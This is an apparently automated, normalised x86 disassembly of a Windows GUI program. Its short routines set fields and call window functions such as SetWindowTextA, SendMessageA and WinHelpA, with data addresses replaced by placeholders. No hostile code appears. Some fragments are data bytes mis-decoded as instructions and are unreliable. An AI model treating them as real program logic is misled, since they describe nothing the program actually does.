sub_43abd8
mov ecx [ eax + 0x220 ]
mov [ edx ] ecx
mov ecx [ eax + 0x224 ]
mov [ edx + 0x4 ] ecx
retn
sub_43abec
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x220 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x224 ] edx
pop ebp
retn 0x8
sub_43ac08
mov ecx [ eax + 0x240 ]
mov [ edx ] ecx
mov ecx [ eax + 0x244 ]
mov [ edx + 0x4 ] ecx
retn
sub_43ac1c
mov ecx [ eax + 0x248 ]
mov [ edx ] ecx
mov ecx [ eax + 0x24c ]
mov [ edx + 0x4 ] ecx
retn
sub_43ac30
mov ecx [ eax + 0x250 ]
mov [ edx ] ecx
mov ecx [ eax + 0x254 ]
mov [ edx + 0x4 ] ecx
retn
sub_43ac44
mov ecx [ eax + 0x258 ]
mov [ edx ] ecx
mov ecx [ eax + 0x25c ]
mov [ edx + 0x4 ] ecx
retn
sub_43ac58
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x240 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x244 ] edx
pop ebp
retn 0x8
sub_43ac74
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x248 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x24c ] edx
pop ebp
retn 0x8
sub_43ac90
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x250 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x254 ] edx
pop ebp
retn 0x8
sub_43acac
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x258 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x25c ] edx
pop ebp
retn 0x8
sub_43ad37
jmp sub_4039ec
sub_43ad3e
pop ebp
retn
sub_43ad40
sub [ rw-data ] 0x1
retn
sub_43adaf
jmp [ edi ]
sub_43b050
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43b068
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_43b0ac
push ebx
mov ebx eax
mov eax ebx
call sub_43b934
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_43b923
jmp sub_4039ec
sub_43b934
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42cde4
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_43b07c
sub_43b98b
jmp sub_4039ec
sub_43b992
pop ebp
retn
sub_43b994
sub [ rw-data ] 0x1
retn
sub_43baaa
inc esp
add ah dl
iretd
sub_43bc1a
inc esp
add ah dl
iretd
sub_43bf5c
jmp [ eax ]
sub_43caba
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl

sub_43cac6
inc ebx
add [ esi ] cl
int3
sub_43cbb6
inc esp
add ah dl
iretd
sub_43cd72
inc esp
add ah dl
iretd
sub_43d746
inc esp
add ah dl
iretd
sub_43d8ba
inc esp
add ah dl
iretd
sub_43dfd6
inc esp
add ah dl
iretd
sub_43e17a
inc esp
add ah dl
iretd
sub_43ec2a
jmp sub_4039ec
sub_43ec31
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ecb6
jmp sub_4039ec
sub_43ecbd
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43ecc4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_449914
pop ebx
retn
sub_43ecd8
push ebx
mov ebx eax
mov eax ebx
call sub_44c66c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_449914
pop ebx
retn
sub_43ecf4
push ebx
mov ebx eax
mov eax ebx
call sub_44b640
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_43eda0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446764
pop esi
pop ebx
retn
sub_43ef0a
jmp sub_4039ec
sub_43ef11
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43f020
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_448814
mov eax ebx
mov si 0xffc7
call sub_40346c
pop esi
pop ebx
retn
sub_43f10c
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43f128
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_40346c
sub_43f144
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_43f150
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_42093c
sub_43f164
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43f1c4
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43f238
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_40346c
pop esi
pop ebx
retn
sub_43f254
push esi
mov esi eax
mov eax esi
call sub_448320
mov eax esi
mov si 0xffc7
call sub_40346c
pop esi
retn
sub_43f2f9
jmp sub_4039ec
sub_43f300
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43f308
push ebx
mov ebx eax
mov eax ebx
call sub_448484
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_43f32c
push ebx
mov ebx eax
mov eax ebx
call sub_44849c
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_43f418
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_43fa24
sub_43f42c
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_43fa24
mov eax ebx
call sub_44a5f4
sub_43f450
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_44a5f4
sub_43f464
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_44a5f4
sub_43f4a8
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_44a5f4
sub_43f5a9
jmp sub_4039ec
sub_43f5b0
pop ebx
pop ecx
pop ebp
retn
sub_43f6c8
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_44d054
push eax
call SetWindowTextA
pop ebx
retn
sub_43f6e4
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_44d054
push eax
call SendMessageA
pop ebx
retn
sub_43f78a
jmp sub_4039ec
sub_43f791
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f82a
jmp sub_4039ec
sub_43f9a3
jmp sub_4039ec
sub_43fa08
push ebx
mov ebx eax
mov eax ebx
call sub_43f4bc
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_44a3f0
pop ebx
retn
sub_43fb08
push ebx
mov ebx eax
mov eax ebx
call sub_446370
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_43fc00
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_40346c
sub_43fd5a
mov [ eax + 0x208 ] 0x0
retn
sub_43fd62
jmp sub_4039ec
sub_43fe0c
mov eax [ r-xdata ]
retn
sub_43fe14
xor eax eax
retn
sub_43fe38
retn
sub_43ff50
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_44a5f4
sub_43ffc8
push ebx
mov ebx eax
mov eax ebx
call sub_45e10c
test eax eax
je r-xdata
mov eax ebx
call sub_447c94
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_43ffec
xor eax eax
retn
sub_4400b3
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x60b1173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_4400cc
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_40346c
sub_4401bd
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_4401c6
jmp sub_4039ec
j_sub_4401bd
jmp sub_4401bd
sub_4401cd
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440378
push ebx
mov ebx eax
mov eax ebx
call sub_446370
mov eax ebx
call sub_447c94
pop ebx
retn
sub_44038c
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_440398
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_44a5f4
sub_4403ac
test dl dl
je r-xdata
xor edx edx
call sub_4403c0
retn
mov dl 0x1
call sub_4403c0
retn
sub_44049c
push ebx
mov ebx eax
mov eax ebx
call sub_44b640
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4404b0
call sub_44a5f4
retn
sub_440546
jmp sub_4039ec
sub_44054d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440554
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xd0 ]
sub_440589
jmp sub_4039ec
sub_440590
pop ebp
retn
sub_440594
sub [ rw-data ] 0x1
retn
sub_4406f1
jmp sub_4039ec
sub_4406f8
pop ebp
retn
sub_4406fc
sub [ rw-data ] 0x1
retn
sub_440715
add eax 0xffffffe0
jmp sub_440cfc
sub_44071d
add eax 0xffffffe0
jmp sub_440d64
sub_440725
add eax 0xffffffe0
jmp sub_440e78
sub_44072d
add eax 0xffffffe0
jmp sub_440eec
sub_440735
add eax 0xffffffe0
jmp sub_4409a8
sub_44073d
add eax 0xffffffe0
jmp sub_4409bc
sub_440745
add eax 0xffffffe0
jmp sub_440a34
sub_44074d
add eax 0xffffffe0
jmp sub_440ad8
sub_440755
add eax 0xffffffe0
jmp sub_440adc
sub_44075d
add eax 0xffffffe0
jmp sub_440b64
sub_440765
add eax 0xffffffe0
jmp sub_440cac
sub_44076d
add eax 0xffffffe0
jmp sub_440cb0
sub_440775
add eax 0xffffffe0
jmp sub_440ccc
sub_440787
add [ esp + 0x4 ] 0xffffffe0
jmp sub_40597c
sub_440791
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405990
sub_440965
jmp sub_4039ec
sub_44096c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4409a8
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_40403c
pop ebx
retn
sub_440a23
jmp sub_4039ec
sub_440a2a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440abc
jmp sub_4039ec
sub_440ac3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_440ad8
mov al 0x1
retn
sub_440b57
jmp sub_4039ec
sub_440b5e
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_440c5c
jmp sub_4039ec
sub_440c63
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440cac
mov [ eax + 0xc ] edx
retn
sub_440cb0
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_440d54
jmp sub_4039ec
sub_440d5b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440e5a
jmp sub_4039ec
sub_440e61
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440eda
jmp sub_4039ec
sub_440ee1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_440f6c
jmp sub_4039ec
sub_440f73
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441067
jmp sub_4039ec
sub_44106e
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_441130
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_44107c
call EnumWindows
retn
sub_4411c2
jmp sub_4039ec
sub_4411c9
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4411d4
xor eax eax
retn
sub_4412cd
jmp sub_4039ec
sub_4412d4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4413be
jmp sub_4039ec
sub_4413c5
pop ebp
retn
sub_44141a
jmp sub_4039ec
sub_441421
pop ebp
retn
sub_4425a4
jmp r-xdata
sub_4425a6
0xe8ffe9ff 0xe7ff
sub_4425ad
jmp esi
sub_442c5a
inc esp
add ah dl
iretd
sub_442db6
sbb al 0xde
inc esp
add ah bl
retn 0x44
sub_442dbe
clc
retn 0x44
sub_442dc2
lodsb [ esi ]
fiadd [ eax + eax + 0x74 ]
retn
sub_443156
inc esp
add ah dl
iretd
sub_4432b2
inc esp
add ah dl
iretd
sub_443379
add eax 0xffffff8c
jmp sub_44f69c
sub_443381
add eax 0xffffff8c
jmp sub_44f6a0
sub_443389
add eax 0xffffff8c
jmp sub_44f78c
sub_443391
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_44339e
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_4433ab
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_4433b8
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_4433c5
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_4433d2
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_4433df
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_4433ec
add eax 0xffffff8c
jmp sub_450dfc
sub_4433fe
add [ esp + 0x4 ] 0xffffff8c
jmp sub_40597c
sub_443408
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405990
sub_443544
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_443857
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_417e74
retn
sub_443874
push 0x15
mov ecx rw-data
call sub_417e34
retn
sub_44390c
call GetCapture
call sub_443644
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_443b70
push ebx
push eax
push sub_443cf4
call sub_4219b8
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_443b88
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_443bb8
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_421a6c
pop ebx
retn
sub_443c96
jmp sub_403738
sub_443cc8
xor eax eax
retn
sub_443ccc
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_443ce4
retn
sub_443ce8
mov eax [ rw-data ]
retn
sub_443cf0
retn
sub_443d1e
jmp sub_403738
sub_443d23
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_466fa8
call sub_403aa0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443d40
call sub_4034b0
xor eax eax
mov [ rw-data ] eax
retn
sub_443d50
call sub_4034ac
xor eax eax
mov [ rw-data ] eax
retn
sub_443d60
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_443e10
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_443e28
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_443e74
retn
sub_44402c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_40346c
pop esi
retn
sub_444040
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_40346c
pop esi
retn
sub_444054
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_444060
mov eax 0x4
retn
sub_444068
retn
sub_444c59
jmp sub_403738
sub_444f46
jmp sub_4039ec
sub_444fb8
jmp sub_4039ec
sub_444fc4
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_444cec
sub_445143
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_424a18
retn
sub_445159
jmp sub_4039ec
sub_445180
jmp sub_4039ec
sub_445202
jmp sub_4039ec
sub_44522a
jmp sub_4039ec
sub_445231
mov esp ebp
pop ebp
retn
sub_4452e9
jmp sub_4039ec
sub_445340
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44530c
mov [ ebx + 0x58 ] esi
sub_445494
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_4454a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403420
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_445591
jmp sub_4039ec
sub_445598
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44561b
jmp sub_4039ec
sub_445622
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4459f0
xor eax eax
retn
sub_4459f4
mov al [ eax + 0x58 ]
retn
sub_4459f8
xor eax eax
retn
sub_4459fc
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_445a04
mov eax [ eax + 0x30 ]
retn
sub_445aa8
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_445b54
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_445b6c
mov [ eax + 0x5d ] dl
retn
sub_445b70
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_449858
sub_445b80
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_446063
jmp sub_4039ec
sub_44606a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4460cc
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_446150
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_44626d
jmp sub_4039ec
sub_446274
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446370
push eax
xor ecx ecx
mov edx 0xb037
call sub_44790c
retn
sub_446531
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_40346c
sub_4465e2
jmp sub_4039ec
sub_4465e9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4466c0
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_44790c
sub_4466d8
push 0x0
xor ecx ecx
mov edx 0xe
call sub_44790c
retn
sub_4466e8
push edx
mov edx 0xd
call sub_44790c
retn
sub_4466f4
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_446708
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_4467e9
jmp sub_4039ec
sub_4467f0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4467f8
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_44790c
sub_446868
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_44687c
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_446888
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_446890
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_44790c
sub_4468b4
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_44790c
sub_4468d8
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_44790c
sub_446920
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_446928
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_44790c
sub_44694c
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_44790c
sub_446970
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_44790c
sub_44698c
push ebx
mov ebx eax
call sub_44390c
cmp ebx eax
sete al
pop ebx
retn
sub_4469c4
push esi
mov dl 0x1
mov si 0xffce
call sub_40346c
pop esi
retn
sub_446b0e
jmp sub_4039ec
sub_446b15
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446c38
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_446bac
retn
sub_446c8c
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_446d79
jmp sub_4039ec
sub_446d98
xor eax eax
retn
sub_446d9c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_446db4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_446dcc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_446de8
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_446e00
retn
sub_446ec4
retn
sub_446ec8
cmp eax [ rw-data ]
sete al
retn
sub_446f3c
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_447058
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_40346c
pop esi
pop ebp
retn 0x4
sub_447098
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_44732f
jmp sub_4039ec
sub_447336
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447340
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_40346c
pop esi
retn
sub_447354
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_40346c
pop esi
retn
sub_447623
jmp sub_4039ec
sub_4476cc
push esi
mov si 0xffee
call sub_40346c
pop esi
retn
sub_4476d8
mov al 0x1
retn
sub_4479b0
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_445db8
retn
sub_4479d4
retn
sub_447bed
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41c034
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_447c08
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41e4ec
retn
sub_447d00
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_447e98
mov eax [ eax + 0x7c ]
retn
sub_448318
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_448320
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_448328
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_4483e0
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_448400
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_4468b4
mov [ ebx + 0x9a ] 0x1
sub_448458
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_446858
mov [ ebx + 0x56 ] 0x1
sub_44847c
mov [ edx + 0xc ] 0x1
retn
sub_448484
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_44790c
sub_44849c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_44790c
sub_4484b4
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_44871a
jmp sub_4039ec
sub_448721
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44874c
mov eax [ r-xdata ]
retn
sub_4488e8
jmp sub_4039ec
sub_4488ef
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448a10
mov eax [ eax + 0xb8 ]
retn
sub_448a78
push ebx
mov ebx eax
mov eax ebx
call sub_446d9c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_448a94
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_448c2c
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_448d3a
jmp sub_4039ec
sub_448d41
pop esi
pop ebx
mov esp ebp
pop ebp
